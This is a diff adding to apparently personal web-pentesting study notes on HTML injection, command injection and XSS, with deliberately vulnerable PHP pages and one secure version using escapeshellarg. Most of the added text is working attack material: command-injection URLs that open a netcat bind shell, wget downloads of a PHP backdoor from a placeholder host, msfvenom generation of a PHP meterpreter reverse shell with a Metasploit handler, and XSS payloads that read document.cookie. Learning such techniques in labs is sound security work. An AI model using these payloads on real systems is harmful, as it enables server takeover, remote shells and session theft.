@@ -217,3 +217,139 @@ Eg: not sanitized code
 
 Xml Http Request (XHR)
 
+HTML Injection Bypass filter
+
+The code session looks like below
+<input type="text" value="" class="input-block-level" placeholder="Email address" name="email">
+
+in text box if you enter value it will assign in to value so you can enter payload there 
+eg: sample" onmouseover="alert('xss');
+
+The above payload will expand the code to below
+<input type="text" value="sample" onmouseover="alert('xss');" class="input-block-level" placeholder="Email address" name="email">
+
+
+# COMMAND Injection Attack
+
+If user inputs are not sanitized attacker can run multiple commands piggypack on existing one
+
+Vulnerable code
+
+1) a.php
+
+<html>
+
+<body>
+
+	<b>File in path are: </b><br><pre>
+	<?php 
+
+		$cmd = "ls -alh ".$_REQUEST['path'];
+		passthru($cmd);
+
+	?></pre>
+</body>
+
+</html>
+
+attack payload
+
+http://localhost/a.php?path=/tmp/;nc -l -p 444 -e /bin/bash;
+
+
+2) b.php
+<html>
+
+<body>
+
+	<b>File in path are: </b><br><pre>
+	<?php 
+
+		$cmd = "ls -alh ".str_replace(';', ' ', $_REQUEST['path']);
+		passthru($cmd);
+
+	?></pre>
+</body>
+
+</html>
+
+attack payload
+
+http://localhost/b.php?path=/tmp/ | nc -l -p 444 -e /bin/bash
+
+
+3) c.php (Secure code)
+
+<html>
+
+<body>
+
+	<b>File in path are: </b><br><pre>
+	<?php 
+
+		$cmd = "ls -alh ".escapeshellarg($_REQUEST['path']);
+		passthru($cmd);
+
+	?></pre>
+</body>
+
+</html>
+
+Web to shell on the server
+
+exploitation using command injection vulnerability(web root directory is writable)
+
+Payload
+http://localhost/b.php?path=/tmp/ |wget http://ip/php-backdoor.php (the backdoor is available on kali /usr/share/webshells/php)
+
+exploit 
+http://localhost/php-backdoor.php //run waht you want
+
+PHP meterpreter
+
+Genrate php meterpreter payload using msfvenom
+> msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_machine -f raw > php-meter.php (remove guard bit after open the file)
+
+exploitation using command injection vulnerability(web root directory is writable)
+
+Payload
+http://localhost/b.php?path=/tmp/ |wget -O /tmp/php-meter.php http://ip/php-meter.php (web root is not writable. the backdoor is available on kali /usr/share/webshells/php)
+
+in metasploit shell
+
+msf>use exploit/multi/handler
+msf exploit (handler) > set PAYLOAD php/meterpreter/reverse_tcp
+PAYLOAD php/meterpreter/reverse_tcp
+msf exploit (handler) > set LHOST attacker_IP
+LHOST attacker_IP
+msf exploit (handler) >exploit
+
+exploit 
+http://localhost/b.php?path=/tmp; php -f /tmp/php-meter.php;
+
+you can get session on meterpretter
+
+# XSS
+
+Basic test payload (enter in text box)
+"><h1>Hello</h1><!--
+"><script>alert(document.cookie)</script><!--
+
+chrome has xss protection builtin, you can see the error in javascript console
+
+Type1 XSS persisitant (we can inject the xss code)
+
+XSS with event handlers
+
+payload
+
+abc" onmouseover=alert("XSS")" //enter this in text field you can use this severl places
+
+Dom based XSS
+
+
+
+
+
+
+
